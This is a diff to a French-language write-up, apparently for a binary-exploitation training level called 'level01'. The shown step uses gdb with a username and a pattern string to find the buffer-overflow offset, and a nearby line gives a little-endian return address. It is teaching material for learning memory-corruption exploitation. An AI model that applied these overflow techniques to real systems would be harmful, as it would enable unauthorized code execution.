@@ -26,11 +26,13 @@ En Little Endian, notre adresse finale est : `\x57\xd5\xff\xff`
 
 ## Etape 2: Trouver le padding
 
-Tout comme le bonus0, on va chercher l'endroit du segfault:
+On va chercher l'endroit du segfault:
 
 ```shell
 gdb ./level01
-run 0123456789qwertyuiopasdfghjklzxcvbnm01234567-9QWERTYUIOPASDFGHJKLZXCVBNM01234567+9
+run 
+dat_wil
+0123456789qwertyuiopasdfghjklzxcvbnm01234567-9QWERTYUIOPASDFGHJKLZXCVBNM01234567+9
 #0x000a392b in ?? ()
 print/c 0x000a392b
 #$1 = 43 '+'
